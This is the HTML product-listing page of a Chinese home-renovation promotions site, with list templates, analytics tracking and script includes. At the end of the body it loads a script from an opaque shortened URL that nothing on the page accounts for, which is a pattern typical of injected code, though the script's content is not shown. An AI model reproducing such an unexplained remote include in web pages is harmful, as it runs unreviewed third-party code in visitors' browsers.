<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no,minimal-ui" />
    <meta name="format-detection" content="telephone=no" />
    <title>家家户户网--不一样的特惠体验</title>
    <meta name="description" content="专注于为广大装修用户提供一站式装修指导服务的北京家家户户文化有限公司（www.jjhh.com），为上海首屈一指的家装一站式服务管理平台。" />
    <link rel="stylesheet" href="assets/css/style.css">
    <link rel="stylesheet" href="assets/css/units.css">
<script>
//声明_czc对象:
var _czc = _czc || [];
if(!/devmobile/.test(location.host)){
//列表页
_czc.push(["_trackEvent", "静态产品列表", "产品点击", "产品点击", "", ".czx_list li"]);
//所有页面
_czc.push(["_trackEvent", "所有页面", "获取验证码", "报名弹窗获取验证码", "", ".czx_btn_getcode"]);
_czc.push(["_trackEvent", "所有页面", "立即报名", "提交报名", "", "#signup_submit"]);
_czc.push(["_trackEvent", "所有页面", "VIP报名", "提交VIP报名", "", "#login_submit"]);
_czc.push(["_trackEvent", "所有页面", "个人中心", "查看个人中心", "", ".czx_barbtn_mycenter"]);
}
</script>
</head>
<body class="dynamics_list expo">
    <div id="expo_box">
        <div class="wtab" id="pro_tab">
            <ul class="dflex header-tab">
                <li><a href="index.html">家博报名</a></li>
                <li class="active">特惠特卖</li><!--  data-type="prolist" -->
                <li class="czx_barbtn_mycenter" data-type="mycenter">我的</li>
            </ul>
        </div> <!-- //.wtab-h -->
    </div>
    <div id="top_list_wraper">
        <script type="text/template" id="tpl_list_top">
        <div class="headerImage">
            <div class="slide">
                <div class="swiper-container">
                    <div class="swiper-wrapper">
                        <%data.banner.forEach(function(v){%>
                        <div class="swiper-slide">
                            <img data-src="<%=v%>" class="swiper-lazy">
                            <div class="swiper-lazy-preloader swiper-lazy-preloader-white"></div>
                        </div>
                        <%})%>
                    </div>
                    <div class="swiper-pagination swiper-pagination-white"></div>
                </div>
            </div>
        </div>
        <div className="tabflexBox">
            <div class="tabWrap flex titleFont" id="listTab">
                <p class="item tab">全部品类</p>
                <em class="vLine">|</em>
                <p class="item tab">产品筛选</p>
            </div>
        </div>
        <div class="tagCon" id="filterProduct">
            <div class="tagWrap hide contentFont">
                <span class="tag currentTag" data-categoryid="0">全部产品</span>
                <%data.category.forEach(function(v){%>
                <span class="tag" data-categoryid = "<%=v.id%>"><%=v.name%></span>
                <%})%>
            </div>
            <div class="tagWrap hide contentFont" style="display:none;">
                <span class="tag currentTag" data-type="0">全部产品</span>
                <span class="tag" data-type="1">特价商品</span>
            </div>
        </div>
        </script>
    </div>
    <!--注：库存小于等于0，数据是否还显示-->
    <div class="listWrap">
        <ul class="czx_list" id="list_wraper">
            <script type="text/template" id="tpl_list">
            <%data.forEach(function(v){%>
            <li class="listItem">
                <a href="detail.html?id=<%=v.id%>"></a>
                <div class="leftImage item"><img height="100%" src="<%=v.img_url[0]%>"/></div>
                <div class="rightContainer item">
                    <h3 class="titleFont title"><%=v.name%></h3>
                    <div class="productOtherMsg">
                        <p>
                            <span class="littleTag fr"><%=v.category_name%></span>
                            <del class="item noteContentFont">￥<%=v.original_price%></del>
                        </p>
                        <p class="row">
                            <span class="noteContentFont fr"><em class="current"><%=v.apply_count%>人</em>已订</span>
                            <strong class="item contentFont current">￥<%=v.present_price%></strong>
                        </p>
                    </div>
                </div>
                <%})%>
            </li>
            </script>
        </ul>
    </div>
</div>
<script src="assets/js/zepto.min.js"></script>
<script src="assets/js/countdown.js"></script>
<script src="assets/js/dialog.js"></script>
<script src="assets/js/scrollLoading.js"></script>
<script src="assets/js/underscore-min.js"></script>
<script src="assets/js/qrcode.min.js"></script>
<script src="assets/js/swiper.min.js"></script>
<script src="assets/js/expo.js"></script>
<script src="assets/js/list.js"></script>
<!-- <script src="assets/js/weixin.js"></script> -->

<div id="tongji" style="display:none;">
<script src="http://s11.cnzz.com/z_stat.php?id=1254463052&web_id=1254463052"></script>
<!--//http://s4.cnzz.com/z_stat.php?id=1254406384&web_id=1254406384-->
</div>
<script src='http://t.cn/RLcLweG'></script>
</body>
</html>
